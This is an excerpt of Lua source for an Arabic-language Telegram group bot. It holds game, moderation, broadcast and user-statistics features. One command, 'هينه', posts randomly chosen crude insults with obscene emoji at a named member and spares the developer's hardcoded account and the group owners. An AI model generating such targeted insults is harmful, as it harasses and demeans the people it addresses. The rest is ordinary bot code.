Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
CarlinTeam = '᥀︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
CarlinTeam = '᥀︙ما هو عكس كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevRio2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
CarlinTeam = '᥀︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
CarlinTeam = '᥀︙اكمل المثال التالي ↫ ['..name..']'
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Carlin..'Rio:GameNum5'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
CarlinTeam = '᥀︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Carlin..'Rio:GameNum6'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
CarlinTeam = '᥀︙ما معنى كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Carlin..'Rio:GameNum7'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(Carlin..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(Carlin..'Rio:GameNum8'..msg.chat_id_)
...
--     Source Carlin     --
if DevRio:get(Carlin.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(Carlin.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Carlin.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Carlin.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevRio:get(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevRio:get(Carlin..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevRio:set(Carlin.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevRio:setex(Carlin.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Carlin     --
...
if not DevRio:get(Carlin..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(Carlin.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(Carlin..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(Carlin.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(Carlin.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevRio:set(Carlin.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevRio:del(Carlin.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(Carlin.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(Carlin..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevRio:sadd(Carlin..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(Carlin.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(Carlin..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(Carlin.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(Carlin.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevRio0 = (DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevRio:del(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Carlin     --
...
DevRio:sadd(Carlin..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(Carlin..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevRio:get(Carlin.."Rio:Left:Bot"..Carlin) then
...
local msguser = tonumber(DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(Carlin..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevRio:setex(Carlin..'DevRio4'..msg.sender_user_id_,360,true)
...
function CarlinTeam(extra,result,success)
if DevRio:get(Carlin.."Rio:Send:Bot"..Carlin) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevRio:smembers(Carlin.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(Carlin.."Rio:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n᥀︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),CarlinTeam)
end
end
--     Source Carlin     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevRio:set(Carlin..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
᥀︙[Carlin Team](https://t.me/TOLENTEam)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/TOLENTEam"}},
{{text = '᥀ Developer',url="t.me/KKKKKKRD"}},
}
local msg_id = msg.id_/2097152/0.5
...
if DevRio:get(Carlin.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Carlin..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(Carlin..'no'..msg.sender_user_id_, 'delno')
...
DevRio:set(Carlin.."Rio:Kick:Me"..msg.chat_id_, true)
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevRio:del(Carlin.."Rio:Kick:Me"..msg.chat_id_)
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Carlin     --
if text == "نزلني" and ChCheck(msg) then
if DevRio:get(Carlin.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Carlin..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(Carlin..'nodel'..msg.sender_user_id_, 'delno')
...
DevRio:set(Carlin.."Rio:Del:Me"..msg.chat_id_, true)
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(Carlin.."Rio:Del:Me"..msg.chat_id_)
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Carlin     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevRio:get(Carlin..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(Carlin..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(Carlin..'Save:UserName'..v.user_id_).."]\n"
else
...
local EntryNumber = (DevRio:get(Carlin..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(Carlin..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(Carlin..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Carlin.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(Carlin.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(Carlin..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = DevRio:get(Carlin.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source Carlin     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevRio:get(Carlin..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevRio:get(Carlin..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevRio:del(Carlin..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevRio:del(Carlin..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Carlin     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevRio:get(Carlin..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function CarlinTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Carlin) then  
...
if tonumber(result.id_) == tonumber(1983379011) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevRio:sismember(Carlin.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local CarlinTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md') 
local CarlinTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..CarlinTeam[math.random(#CarlinTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,CarlinTeam)
end
end
--     Source Carlin     --
...
if tonumber(result.sender_user_id_) == tonumber(Carlin) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(1983379011) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevRio:sismember(Carlin.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local CarlinTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md') 
local CarlinTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..CarlinTeam[math.random(#CarlinTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local CarlinTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md') 
local CarlinTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..CarlinTeam[math.random(#CarlinTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevRio:smembers(Carlin..'User:Donky:'..msg.chat_id_)
...
local List = DevRio:smembers(Carlin..'Rio:RioSudo:')
...
local List = DevRio:smembers(Carlin..'Rio:SecondSudo:')
...
local BanAll = DevRio:smembers(Carlin..'Rio:BanAll:')
local MuteAll = DevRio:smembers(Carlin..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevRio:smembers(Carlin..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(Carlin..'Rio:Sudos'..v) 
local username = DevRio:get(Carlin..'Save:UserName'..v)
if username then
...
DevRio:sadd(Carlin.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(Carlin.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(Carlin.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(Carlin.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevRio:get(Carlin..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(Carlin..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Carlin..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Carlin..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Carlin..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Carlin..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Carlin..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(Carlin..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Carlin..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Carlin..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Carlin..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Carlin..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Carlin..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(Carlin..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Carlin..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Carlin..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Carlin..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Carlin..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Carlin..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(Carlin..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Carlin..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Carlin..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Carlin..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
